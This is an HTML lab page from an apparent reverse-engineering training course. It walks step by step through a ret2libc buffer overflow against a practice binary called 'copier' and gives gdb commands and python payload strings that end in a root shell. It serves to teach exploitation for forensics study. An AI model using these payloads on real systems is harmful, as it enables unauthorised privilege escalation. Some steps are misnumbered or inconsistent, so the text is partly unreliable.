<!-- 
=============================
______ _____ __  _____  __  
| ___ \  ___/  ||  _  |/  | 
| |_/ / |__ `| || |/' |`| | 
|    /|  __| | ||  /| | | | 
| |\ \| |____| |\ |_/ /_| |_
\_| \_\____/\___/\___/ \___/
                            
Site archive:   https://github.com/citizenstaar
Video archive:  https://www.youtube.com/user/CitizenXray

=============================
 -->
 
 
 <!DOCTYPE html>
<html>
<head>
    <title>RE+DFIR101 - Malware Analysis Short Stories</title>
    <link rel="shortcut icon" href="https://github.com/citizenstaar/scar/images/re101.png">
    <link rel="alternate" href="https://github.com/citizenstaar/scar/rss/rss.xml" type="application/rss+xml" title="RE101"/>
    <link href='https://fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="https://citizenstaar.github.io/scar/css/style.css" media="screen">
</head>


<body>
    
    <div id="page">
        <div id="content">

        <!--HEADER SECTION -->
     <div id="header"><pre>
<a class="node" href="https://citizenstaar.github.io/scar/">
  ____  _____ _____ ____  ______   ______  
 |  _ \| ____|_   _|___ \/ ___\ \ / / ___| 
 | |_) |  _|   | |   __) \___ \\ V /\___ \ 
 |  _ <| |___  | |  / __/ ___) || |  ___) |
 |_| \_\_____| |_| |_____|____/ |_| |____/ 
                                           
                                                     
<center><h1>DFIR101 - Exploit2Forensics</h1></center>		
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
</pre>
            </div>


            <!--THE LIST -->
            
            <div id="list">
            
            <ul>
<h2>		EXPLOIT DEVELOPMENT </h2>
</br>
<li>Please open a shell to begin the steps that follow:</li>
</br>
</br>

<li>1.  Open copier in gdb:  "gdb ./copier"</li>
</br>
<li>2.  Set a breakpoint on main with "break main"  </li>
</br>
<li>3.  Run the program with a "r"</li>
</br>
<li>4.  Start looking for SHELL=/bin/bash in your environmental variables by increasing the number behind the + by one. " x/s *((char **)environ+1)"</li>
</br>
<li>5.  Add 6 to the address printed on left "0xFFFFFFFF:  "SHELL=/bin/bash""</li>
</br>
<li>5.  Check if your math is correct by attempting to read the address and look for "/bin/bash" with the command "x/s 0xFFFFFFFF"</li>
</br>
<li>6.  Get the address of System.  "p system"</li>
</br>
<li>7.  Lets validate that we have control of eip by checking if our value of "ABAB" is printed during segmentation fault which should appear as "0x42414241 in ??()".  Type this "r $(python -c 'print "\x90"*112 + "ABAB"')</li>
</br>
<li>8.  If we do not get the result in the prior step adjust the value after the "*" up or down.  You would go up if you are seeing "\x90" in your segmentation fault.  If you see anything other then "0x42414241" adjust upwards.</li>
</br>
<li>9.  Now we have 3 important pieces of information.  The address of System, string of /bin/bash, and the exact offset to control eip.</li>
</br>
<li>10. Type "r $(python -c 'print "A"*112+"SYSTEMADDRESSGOESHEREBACKWARDS"+"BBBB"+"STRINGOFBASHGOESHEREBACKWARES"').  An example of your address was 0xF7E44940 for system and 0xFFFFd8a1 for string of /bin/bash your exploit would be "r $(python -c 'print "A"*112+"\x40\x49\xe4\xf7"+"BBBB"+"\xa1\xd8\xff\xff"')"</li>
</br>
<li>11. If you drop into a non-root shell execute "./copier $(python -c 'print "A"*112+"\x40\x49\xe4\xf7"+"BBBB"+"\xca\xd3\xff\xff"')"</li>
</br>
<li>12. You are now root...check the running environment as root with a "ps -aex --forest"</li>
</br>

</br>	

    </ul>
            </div>            
            <!--FOOTER SECTION -->

            <div id="footer">
                <pre>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</pre>
                <div class="filter">
                <a target="_blank" href="https://citizenstaar.github.io/scar/">HOME</a>
                <span class="footdogs">  &#215; </span>
                <a target="_blank" href="https://github.com/citizenstaar">GITHUB</a>
				 <span class="footdogs">  &#215; </span>
                <a target="_blank" href="https://www.youtube.com/user/CitizenXray">YOUTUBE</a>
				 <span class="footdogs">  &#215; </span>
                <a target="_blank" href="https://www.linkedin.com/in/peter-staarfanger-cissp-issep-b8504315/">LINKEDIN</a>
				<span class="footdogs">  &#215; </span>
				<a target="_blank" href="https://digitalfirstresponse.blogspot.com/">BLOG</a>
                </div>

        </div>

</body>
</html>